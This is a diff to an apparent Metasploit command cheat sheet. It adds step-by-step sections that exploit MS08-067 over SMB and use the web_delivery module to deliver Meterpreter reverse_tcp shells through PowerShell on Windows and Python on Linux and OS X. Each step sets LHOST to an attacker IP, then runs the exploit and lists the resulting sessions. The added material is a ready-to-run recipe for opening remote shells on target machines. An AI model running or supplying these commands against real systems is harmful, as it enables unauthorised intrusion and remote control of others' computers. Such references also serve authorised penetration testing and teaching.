@@ -59,20 +59,40 @@ db_rebuild_cache              Rebuilds the database-stored module cache
 
 help or ?                     Show available commands and their descriptions.
 show -h                       Show help on the 'show' command.
+------------------------------------------------------------------------------------------------------
 
-search <string>               Search for a particular string.
+# Basic exploit
+
 search ms08                   Show all Microsoft exploits released in 2008.
 
-use <exploit>
 use exploit/windows/smb/ms08_067_netapi
 show targets                  Show various OSs that can be targeted with this exploit.
 show payloads                 Show all payloads that work with this exploit.
 set PAYLOAD windows/meterpreter/reverse_tcp
 show options                  Show remainging options for the payload.
-set LPORT 443                 Set the listening port to 443.
 set LHOST <attacker IP>       Set the listner to the attacker's IP.
-show advanced
-show evasion
+set LPORT 443                 Set the listening port to 443.
+exploit                       Run the exploit.
+sessions -l                   List all active sessions.
+------------------------------------------------------------------------------------------------------
+
+# Cross platform exploit
+
+- Windows
+use exploit/multi/script/web_delivery
+set LHOST <attacker IP>       Set the listner to the attacker's IP.
+set LPORT 443                 Set the listening port to 443.
+show TARGETS                  Show all targets.
+set TARGET 2                  Set the target language to Powershell.
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit                       Run the exploit.
+
+- Linux and OS X
+use exploit/multi/script/web_delivery
+set LHOST <attacker IP>       Set the listner to the attacker's IP.
+set LPORT 443                 Set the listening port to 443.
+set TARGET 0                  Set the target language to Python.
+set PAYLOAD python/meterpreter/reverse_tcp
 exploit                       Run the exploit.
 ------------------------------------------------------------------------------------------------------
 
